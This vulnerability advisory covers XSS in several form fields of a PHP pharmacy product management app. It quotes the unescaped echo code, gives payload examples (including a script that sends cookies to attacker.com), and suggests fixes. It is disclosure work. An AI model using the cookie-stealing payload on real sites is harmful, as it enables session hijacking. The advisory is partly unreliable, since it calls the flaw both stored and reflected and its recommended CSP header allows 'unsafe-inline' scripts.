

# Title: [xss] in [Web-based Pharmacy Product Management System] <= [v1.0]

# **BUG_Author:** [yaklang. io, IRify, Yakit]

## Product Information
- **Vendor Homepage:** [link](https://www.sourcecodester.com/php/17883/web-based-product-alert-system.html)
- **Software Link:** [download-link](https://www.sourcecodester.com/sites/default/files/download/Senior%20Walter/product_expiry.zip)
- **Affected Version:** [<= v1.0]
- **BUG Author:** yaklang. io, IRify 

## Vulnerability Details
### Vulnerable Files
* `add-admin. php`
	* `$_POST["txtpassword"]`
	* `$_POST["txtfullname"]`
	* `$_POST["txtemail"]`
* `changepassword. php`
	* `$_POST["txtconfirm_password"]`
	* `$_POST["txtnew_password"]`
	* `$_POST["txtold_password"]`
* `add-stock. php`
	* `$_POST["txttotalcost"]`
	* `$_POST["txtproductID"]`
	* `$_POST["txtprice"]`
	* `$_POST["txtexpirydate"]`
* `add-product. php`
	* `$_POST["txtprice"]`
	* `$_POST["txtproduct_name"]`
* `add-category.php`
	* `$_POST["txtcategory_name"]`
* `add-supplier. php`
	* `$_POST["txtsupplier_name"]`
	* `$_POST["txtaddress"]`
### Vulnerability Type
**Stored Cross-Site Scripting (XSS)**
*(CWE-79: Improper Neutralization of Input During Web Page Generation)*
### Root Cause
In this php file, we can find code like this: 
If contain post argument, just echo this, and this post argument can set by this html-from and send POST request. 
```php
// add-admin.php
			  <form  action="" method="POST" enctype="multipart/form-data">
                <div class="card-body">
                  <div class="form-group">
                    <label for="exampleInputEmail1">Email </label>
                    <input type="email" class="form-control" name="txtemail" id="exampleInputEmail1" size="77" value="<?php if (isset($_POST['txtemail']))?><?php echo $_POST['txtemail']; ?>" placeholder="Enter Email">
                  </div>
				   <div class="form-group">
                    <label for="exampleInputEmail1">Fullname </label>
                    <input type="text" class="form-control" name="txtfullname" id="exampleInputEmail1" size="77" value="<?php if (isset($_POST['txtfullname']))?><?php echo $_POST['txtfullname']; ?>" placeholder="Enter Fullname">
                  </div>
```
So we just input the xss payload to this table, and click send, and when we return this page, the post argument will be set and xss will be trigger 
### Impact
- Persistent malicious script execution for all users viewing affected pages
- Session hijacking via cookie theft
- Phishing attacks by modifying page content
- Defacement of application interface
- Potential privilege escalation through admin interface compromise
## Description
### Vulnerability Details:
1. **Affected Functionality**: Multiple form fields in various PHP files (`add-admin.php`, `changepassword.php`, `add-stock.php`, `add-product.php`, `add-category.php`, `add-supplier.php`) are vulnerable to **Reflected Cross-Site Scripting (XSS)**.
2. **Root Cause**:
   - User-controlled input from POST requests is directly echoed back into the rendered HTML without proper output encoding.
   - Specifically, parameters like `txtemail`, `txtfullname`, `txtconfirm_password`, etc., are displayed in input fields and page content.

### Attack Vectors:
1. **Reflected XSS**: Attackers can craft malicious URLs or forms that, when visited by other users, execute arbitrary scripts in their browsers.
2. **Exploitation Path**:
   - Send a crafted POST request with malicious input to pages like `add-admin.php`.
   - The payload is stored in the session or form fields and rendered back unescaped upon page load.
   - The browser executes the payload when the compromised page is viewed.

### Attack Payload Examples:
1. **Basic AlertBox**:
   ```html
   <script>alert('XSS Exploit');</script>
   ```
2. **Storing Session Data**:
   ```html
   <script>document.location='https://attacker.com/log?cookie='+document.cookie;</script>
   ```
3. **Popup Window**:
   ```html
   <img src="x" onerror="window.open('https://attacker.com');">
   ```

## Code Scan 
this vulnerability find by [IRify](ssa.to) :

![image.png](https://s2.loli.net/2025/04/09/OlYji3Tq8CJId6G.png)

## Proof of Concept
We show the example in create user, in `add-admin.php`, in this email input is set  `$_POST["txtemail"]` , this payload work. 
And the other code so do. 
![image.png](https://s2.loli.net/2025/04/09/PSb8fuJ2ylBU9xc.png)


![image.png](https://s2.loli.net/2025/04/09/VByO6MzmT8QvKLR.png)


---

## Suggested Repairs

### Immediate Fixes:
1. **Output Encoding**:
   - Use `htmlspecialchars()` to encode special characters in user-controlled input before echoing it back:
     ```php
     $sanitized_email = htmlspecialchars($_POST['txtemail'], ENT_QUOTES, 'UTF-8');
     ```
2. **Input Validation**:
   - Restrict input to allowed characters using regular expressions:
     ```php
     if (!preg_match('/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/', $_POST['txtemail'])) {
         die('Invalid email format.');
     }
     ```
3. **Use Security Headers**:
   - Implement Content Security Policy (CSP) headers to restrict script execution:
     ```php
     header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';");
     ```
4. **Validate All User Input**:
   - Ensure all form fields are validated both on the client and server side.

### Long-Term Mitigations:
1. **Adopt a Web Security Framework**:
   - Use frameworks like Laravel or Symfony that automatically handle XSS by escaping output.
2. **Use a Web Application Firewall (WAF)**:
   - Implement a WAF to detect and block malicious payloads before they reach your application.
3. **Security Awareness Training**:
   - Train developers in secure coding practices, focusing on input validation and output encoding.

---

## Additional Information

### Technical Background:
- **XSS Types**:
  - **Reflected XSS**: Payload is echoed back in the response and executed in the browser.
  - **Stored XSS**: Malicious script is stored in the application's database and affects all users who view the affected page.
- **OWASP Risks**:
  - Ranked in the top 10 web application security risks by OWASP, XSS can lead to session hijacking, data theft, and account takeovers.
- **Exploitation Techniques**:
  - **Payload Delivery**: Through crafted URLs, form submissions, or embedded scripts.
  - **Advanced Exploits**: Stealing cookies, session tokens, manipulating DOM for phishing, or bypassing SameSite protections.

### Security Coding Practices:
- Always assume user input is malicious.
- Apply the principle of least privilege — minimize script execution wherever possible.
- Prefer parameterized queries for SQL interactions to prevent related vulnerabilities.
